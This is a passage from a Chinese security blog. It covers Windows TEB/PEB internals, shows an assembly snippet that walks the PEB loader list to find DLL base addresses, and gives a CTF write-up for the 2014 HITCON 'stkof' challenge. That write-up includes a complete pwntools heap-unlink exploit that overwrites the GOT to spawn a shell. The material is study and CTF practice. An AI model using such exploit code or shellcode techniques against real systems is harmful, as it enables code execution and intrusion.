<h3 id="ThreadLocalStoragePointer-amp-amp-TlsSlots-amp-amp-TlsExpansionSlots"><a href="#ThreadLocalStoragePointer-amp-amp-TlsSlots-amp-amp-TlsExpansionSlots" class="headerlink" title="ThreadLocalStoragePointer &amp;&amp; TlsSlots &amp;&amp; TlsExpansionSlots"></a>ThreadLocalStoragePointer &amp;&amp; TlsSlots &amp;&amp; TlsExpansionSlots</h3><p>这兄弟仨的偏移分别是0x58、0x1480、0x1780（备注：这里的offset是64位的），他们和线程本地存储（ThreadLocalStorage）有关，简写为TLS，TLS又可以细分为静态TLS和动态TLS，之后的我会专门总结这方面的知识。</p>
<p>ThreadLocalStoragePointer指向的是维护静态TLS数据的地址的指针，而TlsSlots则是存放动态Tls数据的slots数组，而当slots存放不下的时候（最多为0～63），这时候会分配新的内存来放置，TlsExpansionSlots就是指向这个新内存空间的指针</p>
<p>###LastErrorValue </p>
<p>offset为0x34，顾名思义也就是最后的错误。举个例子来理解，在病毒文件执行时一般会检查是否在当前环境下已经运行，病毒会调用CreateMutex创建互斥体并根据函数的执行结果来判断，这时就会通过fs寄存器拿到TEB结构下的LastErrorValue，如果value大于0的话说明互斥体创建错误，病毒已经在执行了，如果是0的话那就说明没有错误，开始执行病毒文件</p>
<p>###CountOfOwnedCriticalSections</p>
<p>offset为0x38，其作用是记录临界区的数量。所谓临界区（Critical Section）是一种轻量级的同步机制，它和上面提到过的Mutex不同，Mutex是内核的同步对象，而临界区完全是用户态在维护的，所以它只能在一个进程内供线程同步使用，但也正因为不需要关心它在内核和用户态之间的切换，所以它的执行效率要比其他的同步机制要大大提高，关于这些同步机制，在以后的windows调试艺术中还会慢慢的给大家带来。</p>
<p>###CsrClientThread</p>
<p>offset为0x3c，其实和csrss（client service runtime subsystem）客户服务运行子系统相关，在进行相关操作时会用它来记录父进程的PID，同样这部分不是这里的重点，以后有机会继续写这个系列的话会写到这方面</p>
<p>以上就是我会用到的TEB的内容，其余的部分有兴趣的可以自己再去研究</p>
<h2 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h2><p>当我们找到了TEB时实际上我们也就找到了PEB（Thread Environment Block，线程环境块），通过FS:[0x30]我们就可以轻松的拿到PEB的地址，PEB和TEB类似，但它为我们提供的却是进程相关的信息，当然，要想用好PEB，还得深入探究一下它到底能为我们提供什么。</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1g14rov93xfj30sy0iatd3.jpg" alt="image-20190316173312710"></p>
<p>实际上PEB是一个进程内核对象，在没有开启随机化的情况下，它的地址在32位上就是0x7ffd7000，很明显是一个用户空间的可访问数据，当为了能在具体运行环境下拿到他的地址还是FS:[0x30]更为保险，当然也可以通过EPROCESS来访问，不过一是EPROCESS位于内核空间，访问需要Ring0权限，二来和要讨论的LDR调试也没关系，所以这里就不提了</p>
<h3 id="BeingDebugged-amp-amp-NtGlobalFlag"><a href="#BeingDebugged-amp-amp-NtGlobalFlag" class="headerlink" title="BeingDebugged &amp;&amp;NtGlobalFlag"></a>BeingDebugged &amp;&amp;NtGlobalFlag</h3><p>第一个兄弟一看便知，是用来判断我们是否处于调试状态的，win32有个API叫做IsDebuggerPresent，就是通过拿到它来判断程序是不是处于被调试状态的，你可以用它来实现最最简单的反调试，下面就是函数的源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IsDebuggerPresent(VOID)</span><br><span class="line">&#123;</span><br><span class="line">    return NtCurrentPeb()-&gt;BeingDebugged;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那你可能又会想了，为什么这么简单，如果我们在调试过程中手动修改内存不就可以绕过了吗？当然不是，实际上BeingDebufgged被设置为了true会导致一系列的“连锁反应”，首先就是NtGlobalFlag会进行修改，然后RtlCreateHeap中会用RtlDebugCreateHeap创建调试堆，这个调试堆里可有很多平常没有的数据。人家照样能发现你。</p>
<h3 id="ProcessHeap-amp-amp-HeapSegmentReserve-amp-amp-HeapSegmentCommit-amp-amp-NumberOfHeap-amp-amp-MaximumNumberOfHeaps等等"><a href="#ProcessHeap-amp-amp-HeapSegmentReserve-amp-amp-HeapSegmentCommit-amp-amp-NumberOfHeap-amp-amp-MaximumNumberOfHeaps等等" class="headerlink" title="ProcessHeap &amp;&amp; HeapSegmentReserve &amp;&amp; HeapSegmentCommit&amp;&amp;NumberOfHeap&amp;&amp;MaximumNumberOfHeaps等等"></a>ProcessHeap &amp;&amp; HeapSegmentReserve &amp;&amp; HeapSegmentCommit&amp;&amp;NumberOfHeap&amp;&amp;MaximumNumberOfHeaps等等</h3><p>这几个都和堆相关，要认识他们就必须要先对heap的产生有一定的了解</p>
<p>windows在创建一个新进程时，在用户态的初始化过程中会调用RtlCreateHeap来创建进程堆（process heap）而它的句柄就会保存到ProcessHeap里，而HeapSegmentReserve就是进程堆的保留大小，默认为1m，HeapSegmentCommit是进程堆的初始提交大小，其默认值为两个内存页大小，X86系统中普通内存页的大小为4KB。实际使用中我们可以用GetProcessHeap这个函数来拿到堆的句柄，但实际上这个函数归根结底也是通过PEB的ProcessHeap字段拿到的。</p>
<p>NumberOfHeaps字段用来记录堆的数目，MaximumNumberOfHeaps也就是heap的最大数量，HeapDeCommitTotalFreeThreshold和HeapDeCommitFreeBlockThreshold则涉及到了堆的收缩和扩张问题</p>
<p>当然，堆是门复杂的学问，windwos的堆管理机制比起linux来说要繁琐得多，以后还是会专门总结的。</p>
<p>###Fls相关</p>
<p>Fls是涉及到纤程（fiber）的一系列字段，类比Tls相关的字段即可，纤程拥有独立的栈和寄存器，可以通过ConvertThreadToFiber将线程转换为纤程。纤程和线程最大的不同就是前者处于用户态，后者则是内核维护，简单说纤程就是我们掌握的线程。当年为了让UNIX的代码能够更快更正确（由于windows的内存管理机制较为复杂且牵扯到异常管理机制所以移植难以取得好的效果）的移植到windows平台上微软在操作系统中添加了fiber。</p>
<p>###Ldr</p>
<p>这个字段是要讨论的重点，LDR调试中的ldr也就是指这个字段，它作为指针指向了_PEB_LDR_DATA结构体，如下所示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nt!_PEB_LDR_DATA</span><br><span class="line">   +0x000 Length           : Uint4B</span><br><span class="line">   +0x004 Initialized      : UChar</span><br><span class="line">   +0x008 SsHandle         : Ptr64 Void</span><br><span class="line">   +0x010 InLoadOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +0x020 InMemoryOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +0x030 InInitializationOrderModuleList : _LIST_ENTRY</span><br></pre></td></tr></table></figure>
<p>前几个成员像是Length长度啊、Initialized是否初始化啊之类都非常简单，重要的是后三个，他们分别表示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InLoadOrderModuleList;                //模块加载顺序</span><br><span class="line">InMemoryOrderModuleList;              //模块在内存中的顺序</span><br><span class="line">InInitializationOrderModuleList;      //模块初始化装载顺序</span><br></pre></td></tr></table></figure>
<p>他们本身也是结构体，即_LIST_ENTRY</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br></pre></td></tr></table></figure>
<p>可以看到成员还是结构体，很显然就是个双向链表，而这些指针又指向了LDR_DATA_TABLE_ENTRY 这个结构体结构体的第四个字段也就是DLL的加载基址，要特别注意，这个结构系统会为每个dll都维护一个，且由于构成了双向链表，我们可以轻易的通过一个dll找到下一个的基址，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">     LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">     LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">     PVOID DllBase;</span><br><span class="line">     PVOID EntryPoint;</span><br><span class="line">     ULONG SizeOfImage;</span><br><span class="line">     UNICODE_STRING FullDllName;</span><br><span class="line">     UNICODE_STRING BaseDllName;</span><br><span class="line">     ULONG Flags;</span><br><span class="line">     WORD LoadCount;</span><br><span class="line">     WORD TlsIndex;</span><br><span class="line">     <span class="keyword">union</span></span><br><span class="line">     &#123;</span><br><span class="line">          LIST_ENTRY HashLinks;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               PVOID SectionPointer;</span><br><span class="line">               ULONG CheckSum;</span><br><span class="line">          &#125;;</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="keyword">union</span></span><br><span class="line">     &#123;</span><br><span class="line">          ULONG TimeDateStamp;</span><br><span class="line">          PVOID LoadedImports;</span><br><span class="line">     &#125;;</span><br><span class="line">     _ACTIVATION_CONTEXT * EntryPointActivationContext;</span><br><span class="line">     PVOID PatchInformation;</span><br><span class="line">     LIST_ENTRY ForwarderLinks;</span><br><span class="line">     LIST_ENTRY ServiceTagLinks;</span><br><span class="line">     LIST_ENTRY StaticLinks;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>
<p>到这里我们进行LDR调试的基础知识就差不多了，下面就该实战来利用LDR调试来获取各个dll的地址了</p>
<h2 id="LDR调试"><a href="#LDR调试" class="headerlink" title="LDR调试"></a>LDR调试</h2><p>我们可以根据上面的知识来先行来理一下思路</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TEB+0x30 -&gt; PEB</span><br><span class="line">PEB+0x0c -&gt; PEB_LDR_DATA</span><br><span class="line">PEB_LDR_DATA -&gt; LDR_DATA_TABLE_ENTRY</span><br></pre></td></tr></table></figure>
<p>根据前面的学习，我们知道了PEB_LDR_DATA的一个结构体字段指向了LDR_DATA_TABLE_ENTRY，而之后LDR_DATA_TABLE_ENTRY用同样的结构体再指向下一个，下一个也用同样结构体的第二个成员指向上一个，形成了双向链表，为了理解方便，这里我们画图展示一下</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1g15uti2tjzj310i0gy75h.jpg" alt="image-20190317160701703"></p>
<p>那我们的思路就明确了，首先我们通过PEB_LDR_TABLE拿到第一个LDR_DATA_TABLE_ENTRY就可以通过offset找到dll base，接着再用offset找到指向下一个的LDR_DATA_TABLE_ENTRY的指针Flink，就可以接着往下找，直到双链表再次指向最开始的地方，不说废话，动手操作一番</p>
<p>我们首先利用    windbg拿到PEB的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !peb</span><br><span class="line">PEB at 002c7000</span><br><span class="line">    InheritedAddressSpace:    No</span><br><span class="line">    ReadImageFileExecOptions: No</span><br><span class="line">    BeingDebugged:            Yes</span><br><span class="line">    ImageBaseAddress:         00400000</span><br><span class="line">    Ldr                       77b30c40</span><br><span class="line">    Ldr.Initialized:          Yes</span><br><span class="line">    Ldr.InInitializationOrderModuleList: 000c3200 . 000c37b0</span><br><span class="line">    Ldr.InLoadOrderModuleList:           000c32f8 . 000c46f0</span><br><span class="line">    Ldr.InMemoryOrderModuleList:         000c3300 . 000c46f8</span><br><span class="line">            Base TimeStamp                     Module</span><br><span class="line">          400000 000062e2 Jan 01 15:01:54 1970 C:\Users\mac\Desktop\RE.exe</span><br><span class="line">        77a10000 C:\Windows\SYSTEM32\ntdll.dll</span><br><span class="line">        77220000 C:\Windows\System32\KERNEL32.DLL</span><br><span class="line">        757d0000 53015794 Feb 17 08:28:04 2014 C:\Windows\System32\KERNELBASE.dll</span><br><span class="line">        752e0000 0435cf49 Mar 28 20:55:37 1972 C:\Windows\System32\msvcrt.dll</span><br></pre></td></tr></table></figure>
<p>windbg自己帮我们拿到了dll的加载基址，我们不去管它，自己继续调试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd 000c32f8</span><br><span class="line">000c32f8  000c31f0 77b30c4c 000c31f8 77b30c54</span><br><span class="line">000c3308  00000000 00000000 00400000 00401280</span><br></pre></td></tr></table></figure>
<p>一开始指向的应当是第一个LDR_DATA_TABLE_ENTRY，排除掉前三个结构体的6个sizeof(ptr)后，就是基址0x400000，显然就是原始模块加载基址，而第一个dword也就是Flink，第二个就是Blink，我们就跟着Flink接着往下找</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd 000c31f0</span><br><span class="line">000c31f0  000c37a0 000c32f8 000c37a8 000c3300</span><br><span class="line">000c3200  000c3b70 77b30c5c 77a10000 00000000</span><br></pre></td></tr></table></figure>
<p>可以看到第二个LDR_DATA_TABLE_ENTRY的dll base字段也就是77a10000，根据我们windbg刚才打印!PEB给我们的信息对照，可以发现就是ntdll的基址，同样在使用Flink，又可以找到下一个。</p>
<p>最后我们找到的是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd 77b30c4c </span><br><span class="line">77b30c4c  000c32f8 000c46f0 000c3300 000c46f8</span><br><span class="line">77b30c5c  000c3200 000c37b0 00000000 00000000</span><br></pre></td></tr></table></figure>
<p>可以看到就是一开始的LDR_DATA_TABLE_ENTRY的Blink，而dll base字段已经是0了，这样我们就根据这个双向链表拿到了所有的dll的基址了，对照一开始weindbg提供给我们的，果然一点没错。</p>
<p>当然可以继续尝试其他两条链的情况，这里就不再详细展示了，需要注意的是InInitializationOrderModuleList在不同版本的操作系统可能会存在得到的链表dll顺序不同的情况，所以不建议使用。下面给出获得dll基址的汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, fs:[ 0x30 ]       // 拿到PEB</span><br><span class="line">mov ebx, [ ebx + 0x0C ]    // 拿到PEB_LDR_DATA</span><br><span class="line">mov ebx, [ ebx + 0x0C ]    // InLoadOrderModuleList1</span><br><span class="line">mov ebx, [ ebx ]           // InLoadOrderModuleList2</span><br><span class="line">mov ebx, [ ebx ]           // InLoadOrderModuleList3</span><br><span class="line">mov ebx, [ ebx + 0x18 ]    // 拿到dll base字段内容</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>LDR链调试是一个很有意思的内容，它牵扯到了很多windows下的重要对象，如果只是去学习这项技术的话很容易，但是要搞清楚经过的每一个对象到底涉及到了其他的什么内容就很难了，不能只停留在这项技术的表面。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/02/Unlink实战-2014-HITCON-stkof/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/02/Unlink实战-2014-HITCON-stkof/" itemprop="url">Unlink实战 -- 2014 HITCON stkof</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-02T12:13:14+08:00">
                2019-03-02
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Unlink实战"><a href="#Unlink实战" class="headerlink" title="Unlink实战"></a>Unlink实战</h1><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><p>unlink技术前面已经学习过了，简单回忆一下其中的关键：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FD=P-&gt;fd </span><br><span class="line">BK=P-&gt;bk</span><br><span class="line">FD-&gt;bk = BK</span><br><span class="line">BK-&gt;fd = FD</span><br><span class="line"></span><br><span class="line">fd = &amp;P<span class="number">-0x18</span></span><br><span class="line">bk = &amp;P<span class="number">-0x10</span></span><br><span class="line">P = &amp;P<span class="number">-0X18</span></span><br></pre></td></tr></table></figure>
<p>ida分析后可以看出程序主要有如下的几个功能：</p>
<ul>
<li>add，功能主要是输入一个size，分配相应的空间，并将指针存在bss段的</li>
<li>edit，指定index，输入size，修改相应index的内容</li>
<li>delete，指定index，free掉相应的空间</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">n = atoll(&amp;s);</span><br><span class="line">ptr = ::s[v2];</span><br><span class="line"><span class="keyword">for</span> ( i = fread(ptr, <span class="number">1u</span>LL, n, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1u</span>LL, n, <span class="built_in">stdin</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  ptr += i;</span><br><span class="line">  n -= i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在edit函数中size由我们输出，没有检查大小，存在溢出漏洞，而bss段中有一数组专门存放我们chunk地址，确定攻击思路为unlink后改写系统函数的地址。</p>
<p>首先用gdb调试，简单分配两个chunk观察内存中的分布情况，设0x602140为head</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1g0nle1paazj30ui046wgl.jpg" alt="image-20190301210035807"></p>
<p>很显然我们的第一个chunk在head+0x8的位置，但要注意，该程序没有进行setbuf操作，所以会在gets、printf时设置输入输出的缓冲区，为了避免产生影响，我们先分配一个chunk保证完成输入输出完成相应的初始化操作，紧接着再考虑攻击的问题。我们构造三个chunk，第一个保留，第二个用来溢出，我设置为0x30，第三个则要大一些（在smallbin的范围内）来触发unlink</p>
<p>我们在chunk2中伪造一个chunk。伪造的重点是chunk的size与溢出下一个chunk的pre_size是否相等、fd与bk指针能不能通过检查、是否将下一个chunk的pre_inuse位成功修改，具体的payload的构造如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1 = p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(fd)+p64(bk)</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x30</span>,<span class="string">'A'</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br></pre></td></tr></table></figure>
<p>之后我们free掉chunk3，此时由于chunk3的pre_inuse显示fake_chunk是free状态，会发生合并，触发unlink，导致我们原本chunk2在bss段位置p的内容变成了p-0x18的值，如图所示</p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g0o9ughp95j30ue04mdhf.jpg" alt="image-20190302110646389"></p>
<p>之后我们就可以通过edit chunk2的方式就可以从0x602138开始写入值了，注意由于我们写的位置是head+0x10-0x18，所以首先要填充0x10，既然要修改系统函数的地址那我们就必须要知道libc的base，我们可以通过puts函数来泄漏某个函数的地址进而计算。这样我们就有了构造下一步payload的思路，我们将chunk1的位置填为free_got，chunk2的位置填为使用过的任意函数（这里我选择了puts）的got，这样我们再次edit chunk1的时候就可以修改free_got的内容了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">8</span>  + <span class="string">'b'</span>*<span class="number">8</span> + p64(free_got) + p64(puts_got)</span><br></pre></td></tr></table></figure>
<p>利用edit将puts的plt地址填入free_got后，我们再次free chunk2实际上就是输出puts_got的值了，接下来就是简单的处理拿到libc的base后算出system的地址，然后再次edit chunk1，把free_got的值改为system。</p>
<p>最后，我们创建一个chunk4，在里面写入/bin/sh，再free掉就大功告成了</p>
<p>完整exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./stkof'</span>)</span><br><span class="line"><span class="comment">#p = remote("192.168.211.126", 10000)</span></span><br><span class="line">elf = ELF(<span class="string">'./stkof'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">head = <span class="number">0x602140</span></span><br><span class="line">fd = head + <span class="number">0x10</span> - <span class="number">0x18</span></span><br><span class="line">bk = head + <span class="number">0x10</span> - <span class="number">0x10</span></span><br><span class="line">alloc(<span class="number">0x50</span>) <span class="comment"># idx 1</span></span><br><span class="line">alloc(<span class="number">0x30</span>) <span class="comment"># idx 2</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># idx 3</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment"># idx 4</span></span><br><span class="line">payload1 = p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(fd)+p64(bk)</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x30</span>,<span class="string">'A'</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>, payload1)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">8</span>  + <span class="string">'b'</span>*<span class="number">8</span> + p64(free_got) + p64(puts_got)</span><br><span class="line">edit(<span class="number">2</span>,payload2)</span><br><span class="line">payload3 = p64(puts_plt)</span><br><span class="line">edit(<span class="number">1</span>,payload3)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">'\nOK\n'</span>, drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.success(<span class="string">"puts_addr is %x\n"</span> %puts_addr)</span><br><span class="line">log.success(<span class="string">"libc_base is %x\n"</span> %libc_base)</span><br><span class="line">log.success(<span class="string">"system_addr is %x\n"</span> %system_addr)</span><br><span class="line"></span><br><span class="line">payload4 = p64(system_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload4)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>##2016 ZCTF note2</p>
<p>首先还是ida分析，整理之后发现有这几个功能：</p>
<ul>
<li>add，添加一个note和note的内容（会检查长度不能大于0x80，且会有一个bss段的ptr来存储地址）</li>
<li><p>show，展示指定index的note的内容</p>
</li>
<li><p>edit，修改指定index的note的内容</p>
</li>
<li><p>delete，删除指定index的note</p>
</li>
</ul>
<p>通过观察add我们发现了这个函数存在漏洞</p>
